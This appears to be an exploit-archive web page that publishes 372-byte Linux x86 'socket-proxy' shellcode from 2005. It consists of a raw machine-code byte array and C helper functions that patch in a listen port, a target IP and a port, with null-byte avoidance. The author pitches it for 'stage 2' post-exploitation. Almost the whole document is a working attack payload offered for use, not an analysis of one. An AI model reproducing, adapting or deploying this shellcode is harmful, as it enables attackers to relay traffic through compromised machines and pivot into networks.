<html><head><title>Linux/x86 - socket-proxy - 372 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*---------------------------------------------------------------------------*
 *                372 byte socket-proxy shellcode                            *
 *              by Russell Sanford - xort@tty64.org                          *
 *---------------------------------------------------------------------------*
 *    filename: x86-linux-bounce-proxy.c                                     *
 *        date: 12/23/2005                                                   *
 *        info: Compiled with DTP Project.                                   *
 * discription: This is a x86-linux proxy shellcode. This is probably best   *
 * 	        used in stage 2 situations. The syntax for invoking the      *
 * 	        patchcode is as follows:                                     *
 *                                                                           *
 * 		patchcode(shellcode,31337,&quot;11.22.33.44&quot;,80);                 *
 *                                                                           *
 * 		Where 31337 is the port to listen to on the remote host      *
 *---------------------------------------------------------------------------*/

char shellcode[] =
&quot;\xe8\xff\xff\xff\xff\xc6\x4e\x5e\x81\xc6\x18\xfc\xff\xff\xeb\x48\x89\xc3\x6a\x03\x59\xb0\xdd\xcd&quot;
&quot;\x80\x56\x89\xde\x80\xcc\x08\x6a\x04\x59\xb0\xdd\xcd\x80\x93\x5e\xc3\x89\xc2\x83\xe0\x1f\xc1\xea&quot;
&quot;\x05\x8d\x8e\x78\xff\xff\xff\x0f\xab\x04\x91\xc3\x93\xb0\x03\x8d\x8e\x48\xf4\xff\xff\x66\xba\x01&quot;
&quot;\x08\xcd\x80\xc3\x93\xb0\x04\x8d\x8e\x48\xf4\xff\xff\xcd\x80\xc3\x8d\xbe\xf8\xfe\xff\xff\x31\xc0&quot;
&quot;\x31\xc9\x66\xb9\x01\x01\xf3\xaa\x31\xc0\x6a\x01\x5b\x50\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b&quot;
&quot;\x5a\x68\x7e\xff\xfe\xff\x81\x04\x24\x01\x01\x01\x01\x68 xor\x81\x04\x24t@tt\x6a\x10\x51\x50\x89&quot;
&quot;\xe1\xb0\x66\xcd\x80\xb3\x04\xb0\x66\xcd\x80\x5a\x50\x50\x52\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89&quot;
&quot;\x46\xfc\xe8\x5b\xff\xff\xff\xe8\x6f\xff\xff\xff\x31\xc0\x6a\x01\x5b\x50\x53\x6a\x02\x89\xe1\xb0&quot;
&quot;\x66\xcd\x80\x5b\x43\x5f\x68y64.\x81\x04\x24org \x68need\x81\x04\x24 job\x6a\x10\x51\x50\x89\xe1&quot;
&quot;\xb0\x66\xcd\x80\x58\x89\x46\xf8\xe8\x19\xff\xff\xff\xe8\x2d\xff\xff\xff\x8b\x5e\xfc\x8b\x4e\xf8&quot;
&quot;\x6a\x01\x53\x51\x6a\x02\x51\x53\x39\xd9\x7e\x02\x89\xcb\x56\x43\x8d\x8e\x78\xff\xff\xff\x31\xd2&quot;
&quot;\x31\xf6\x31\xff\xb0\x8e\xcd\x80\x5e\x58\x50\x89\xc2\x83\xe0\x1f\xc1\xea\x05\x8d\x8e\x78\xff\xff&quot;
&quot;\xff\x0f\xa3\x04\x91\x73\x04\x59\x59\xeb\x32\x58\x50\xe8\xe5\xfe\xff\xff\x58\x31\xff\x47\x83\x7c&quot;
&quot;\x24\x04\x02\x74\x02\xf7\xdf\x01\xf8\xe8\xe4\xfe\xff\xff\x39\xc0\x89\xc2\x58\x31\xff\x47\x83\x3c&quot;
&quot;\x24\x02\x75\x02\xf7\xdf\x01\xf8\xe8\xdd\xfe\xff\xff\x59\xe2\xb1\xeb\x88&quot;;

int find_safe_offset(int INT_A) {

	int INT_B=0;
	
	do {
		INT_A -= 0x01010101;	INT_B += 0x01010101;
	}
	while ( ((INT_A &amp; 0x000000ff) == 0) || 
		((INT_A &amp; 0x0000ff00) == 0) || 
		((INT_A &amp; 0x00ff0000) == 0) ||
		((INT_A &amp; 0xff000000) == 0) );

	return INT_B;
}

void patchcode(char *shellcode, int PORT_IN, char *IP, int PORT_OUT) {
	
	int PORT_IN_A = ((ntohs(PORT_IN) &lt;&lt; 16) + 2);
	int PORT_IN_B = find_safe_offset(PORT_IN_A);	

	int IP_A = inet_addr(IP);
	int IP_B = find_safe_offset(IP_A);

	int PORT_OUT_A = ((ntohs(PORT_OUT) &lt;&lt; 16) + 2);
	int PORT_OUT_B = find_safe_offset(PORT_OUT_A);	

	*(int *)&amp;shellcode[134] = (PORT_IN_A - PORT_IN_B);
	*(int *)&amp;shellcode[141] = PORT_IN_B;

	*(int *)&amp;shellcode[205] = (IP_A - IP_B);
	*(int *)&amp;shellcode[212] = IP_B;
	
	*(int *)&amp;shellcode[217] = (PORT_OUT_A - PORT_OUT_B);
	*(int *)&amp;shellcode[224] = PORT_OUT_B;

}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
